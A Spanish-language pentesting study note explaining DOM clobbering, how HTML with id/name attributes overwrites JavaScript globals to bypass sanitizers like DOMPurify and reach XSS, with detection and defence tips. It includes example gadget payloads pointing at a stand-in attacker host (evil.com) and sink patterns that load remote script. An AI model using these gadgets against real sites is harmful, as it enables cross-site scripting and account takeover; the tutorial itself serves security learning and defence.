---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - XSS
Descripción: "La evasión clásica asume que puedes meter JavaScript"
Fecha de actualización: 2026-06-13
Nota previa: "[[07 - Herramientas para XSS]]"
Nota siguiente: "[[09 - Prototype Pollution hacia XSS]]"
Area: "[[XSS Avanzado.base|XSS Avanzado]]"
---
---

La evasión clásica asume que puedes meter JavaScript. Pero el caso más común hoy es un sanitizador (como [[06 - Evasión de filtros XSS y ofuscación|DOMPurify]]) que permite **HTML** y elimina scripts y event handlers. <mark style="background: #ADCCFFA6;">El `DOM Clobbering` es una técnica que manipula la lógica JavaScript de la página usando solo HTML —sin un solo `<script>` ni `onerror`—</mark>, explotando una peculiaridad heredada de los navegadores: los elementos con atributo `id` o `name` crean automáticamente referencias accesibles como propiedades globales. Es el puente que convierte una inyección de HTML "inofensivo" en manipulación del flujo del programa, y a menudo en XSS.

# La peculiaridad: HTML que crea variables JS

Por compatibilidad histórica, el navegador expone los elementos con `id`/`name` como propiedades de `window` y `document`. Así, este HTML —que cualquier sanitizador aprueba— crea una variable global:

```html
<a id="cfg">
```

```javascript
window.cfg   // → referencia al elemento <a>, ¡sin declararlo en JS!
```

<mark style="background: #8000E1A6;">Si el código JavaScript lee una variable global que el desarrollador asumió controlada (`window.cfg`, `config.url`), podemos "machacarla" (*clobber*) desde el HTML</mark> y sustituir su valor por uno nuestro.

# Construir gadgets

Un solo elemento da una referencia simple; encadenando se llega a estructuras anidadas que imitan objetos de configuración:

- **Propiedad anidada** con `form` + `input`: `cfg.url` accesible desde HTML:
  ```html
  <form id="cfg"><input name="url" value="//evil.com"></form>
  ```
- **Anidamiento de dos niveles** con `HTMLCollection` (dos elementos con el mismo `id` forman una colección, y un `name` interno la indexa):
  ```html
  <a id="cfg"><a id="cfg" name="url" href="//evil.com">
  ```
- **`document.x`** vía anclas/imágenes con `name`, útil cuando el sink lee de `document` en vez de `window`.

El truco de `href` es especialmente potente: <mark style="background: #FFB86CA6;">`window.cfg.url` devuelve la URL absoluta del ancla</mark>, así que controlas el string completo que el JS leerá.

# De clobbering a XSS

El clobbering por sí solo altera variables; se vuelve XSS cuando esa variable alimenta un *sink*. El patrón típico:

```javascript
// Código vulnerable: usa una global asumida "de confianza"
let cfg = window.cfg || {};
element.innerHTML = cfg.template;   // si clobbeamos cfg.template → XSS
```

```javascript
// O un script cargado dinámicamente
let s = document.createElement('script');
s.src = window.config.apiUrl;       // clobber de config.apiUrl → carga JS remoto
```

<mark style="background: #FF5582A6;">El objetivo es localizar un sink que lea una propiedad de un objeto global no inicializado de forma robusta</mark> (`x || default`, `if (window.x)`) y clobbearla para que apunte a contenido o URL que controlamos. Es la misma idea que [[09 - Prototype Pollution hacia XSS|prototype pollution]], pero por la vía del DOM en lugar del prototipo.

> [!warning]+ Por qué importa contra sanitizadores
> DOMPurify y otros sanitizadores, **por defecto, permiten `<a>`, `<form>`, `<img>` con `id`/`name`** —son HTML legítimo—. Eso deja la puerta abierta al clobbering aunque bloqueen todo el JS. DOMPurify ofrece la opción `SANITIZE_DOM`/`SANITIZE_NAMED_PROPS` para mitigarlo, pero no siempre está activada. Ante un sanitizador que permita HTML rico, **probar DOM Clobbering es obligatorio**.

# Encadenamiento avanzado y casos reales

Para sinks que leen propiedades de tres o más niveles (`config.api.url`), se encadenan elementos: varios `<form>`/`<a>` anidados, o un `<iframe name="config" srcdoc="...">` cuyo `srcdoc` aporta un documento entero con sus propios elementos clobbering. También se pueden machacar propiedades de `document` que el código asume nativas —`document.currentScript`, `document.all`— para alterar comprobaciones internas.

<mark style="background: #FFB86CA6;">El caso real de referencia es el XSS en Gmail AMP4Email</mark> (Michał Bentkowski, 2019): un DOM clobbering que sobrescribía una variable interna burló el validador de AMP. El patrón reaparece constantemente junto a sanitizadores —el HTML pasa el filtro y el clobbering reconfigura el JavaScript que lo procesa—, y es temario explícito de los labs de DOM clobbering de PortSwigger.

> [!warning]+ Límites de la técnica
> El clobbering produce **referencias a elementos o strings** (vía `href`/`value`/`toString`), no valores arbitrarios ni funciones ejecutables. No puedes clobbear una función para que ejecute tu código directamente; lo que haces es <mark style="background: #8000E1A6;">redirigir lo que el JS lee hacia un valor que controlas</mark> y dejar que un sink existente haga el resto. Por eso siempre necesitas un gadget que consuma la variable clobbeada.

# Detección y defensa

- **Detección**: identifica en el JS de la página variables globales leídas sin declaración robusta (revisa los [[03 - XSS basado en DOM|sources/sinks del DOM]] con DevTools o DOM Invader, que detecta clobbering). Busca `window.X`, `document.X` y accesos `a.b` sobre objetos no inicializados.
- **Defensa**: declarar e inicializar siempre las variables (`const cfg = {...}`), comprobar el **tipo** (`typeof x === 'object'` no basta — un elemento es objeto; usa `instanceof` o verifica que no sea un nodo), `Object.freeze` en configuración, y activar `SANITIZE_NAMED_PROPS` en DOMPurify.

> [!info]+ Fuentes
> - [PortSwigger — DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
> - [HTML5 Security Cheatsheet](https://html5sec.org/) · research de Gareth Heyes (PortSwigger) y Sebastian Lekies sobre clobbering.

El DOM Clobbering manipula variables vía DOM; la siguiente técnica las manipula contaminando el prototipo que **todos** los objetos heredan: [[09 - Prototype Pollution hacia XSS]].
